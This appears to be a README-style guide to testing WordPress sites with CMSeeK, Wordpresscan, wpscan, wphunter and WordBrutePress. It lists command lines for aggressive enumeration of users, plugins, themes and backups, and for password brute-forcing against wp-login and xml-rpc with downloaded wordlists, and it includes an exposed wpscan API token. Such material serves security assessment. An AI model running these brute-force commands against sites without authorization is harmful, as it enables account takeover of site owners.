# Inspired in C4N6
This guide 'll help U to undertsand if your wordpress webapp is vulnerable to enumerate and bruteforce with different tools the below sub components of this cms. 

- credentials 
- plugins
- themes
- timthumbs

#
Login as root

    su
# Identify the CMS 
And provide the report of what harvested and the vulnerabilities

    cd /usr/share && git clone https://github.com/Tuhinshubhra/CMSeeK && cd CMSeeK && sudo python3 cmseek.py --update
#    
    sudo python3 cmseek.py -u https://yourtarget.com --user-agent random -r

# wordpresscan

    cd /usr/share && git clone https://github.com/swisskyrepo/Wordpresscan.git && pip install tornado
#    
    cd Wordpresscan && sudo python wordpresscan.py -u website.com --update --threads 37 --random-agent --brute --fuzz


# wpscan 

    sudo apt-get install libcurl4-openssl-dev libxml2 libxml2-dev libxslt1-dev ruby-dev build-essential libgmp-dev zlib1g-dev -y && cd /usr/share/wpscan && sudo bundle update && gem update && gem env && gem install wpscan && wpscan --update && wpscan --version && mkdir /usr/share/wordlists && cd /usr/share/wordlists && git clone https://github.com/4k4xs4pH1r3/bbh.git && cd bbh && mv dirbuster /usr/share/ && mv wordlists /usr/share/ && cd /usr/share/dirbuster && mkdir wordlists && cd wordlists && sudo wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkc0de.txt && mv darkc0de.txt darkc0de.lst &&  cd /usr/share/wpscan && sudo mkdir cache
    
# 
In Kali

    wpscan --url http://yourtarget.com --ignore-main-redirect --detection-mode aggressive --interesting-findings-detection aggressive  --wp-version-all --wp-version-detection aggressive --ua --rua -t 10 --throttle 10 --disable-tls-checks --force --update --wp-content-dir /wp-content -e --enumerate vp,vt,tt,cb,dbe,u,m --db-exports-detection aggressive --config-backups-detection aggressive  --main-theme-detection aggressive --themes-detection aggressive --medias-detection aggressive --plugins-version-detection aggressive -v --verbose --no-banner --users-detection aggressive -U ~/users -P /usr/share/dirbuster/wordlists/darkc0de.lst --password-attack wp-login -o ./wpscandebuglog.txt

#
#
# 
In Parrot

   
#      
    sudo wpscan --url https://yourtarget.com/wp-admin --update --user-agent --random-agent --follow-redirection --batch --cache-dir /usr/share/wpscan/cache --wordlist /usr/share/dirbuster/wordlists/darkc0de.lst --usernames ~/users.txt --threads 50 --throttle 10 --enumerate p t u tt --debug-output 2>debug.log --wp-content-dir /wp-content --force --disable-tls-checks --disable-referer --disable-accept-header --no-banner --verbose
    
 In Docker 
 
    docker run -it --rm wpscanteam/wpscan --url https://yourtarget.com/wp-admin --update --force -t 37 --rua --detection-mode aggressive --api-token rXbXUKWwDK6FzlsTg4ydb3IQ1SW4snak0hP6dkO1YzA --detection-mode aggressive --stealthy --password-attack wp-login --plugins-detection aggressive --plugins-version-detection aggressive -v --verbose -e --enumerate vp,vt,tt,cb,dbe,u,m


# wphunter

    cd /usr/share && git clone https://github.com/Jamalc0m/wphunter.git && cd wphunter
#    
    sudo php wphunter.php http://yourtarget.com


# WordBrutePress
    
    apt install git -y && git clone https://github.com/4k4xs4pH1r3/bbh.git /usr/share/wordlists && cd /usr/share/wordlists/wordlists && mv *.* /usr/share/wordlists && mv dirb dirbuster fern-wifi wfuzz /usr/share/wordlists && rm -r /usr/share/wordlists/wordlists && git clone https://github.com/danielmiessler/SecLists.git /usr/share/SecLists && cd && apt install neofetch screenfetch -y && neofetch && cd /usr/share && git clone https://github.com/The404Hacking/WordBrutePress && pip install httplib2 && cd WordBrutePress 
#    
    python2 /usr/share/WordBrutePress/WordBrutePress.py -t http://yoursite.co/wp/ -u username -w /usr/share/SecLists/Passwords/darkc0de.lst

#
[X] You must insert http:// or https:// protocol#



#Standard login brute use this command=
-S, --standard

Xml-rpc login brute use this command=

-X, --xml-rpc
#
# by C4N6
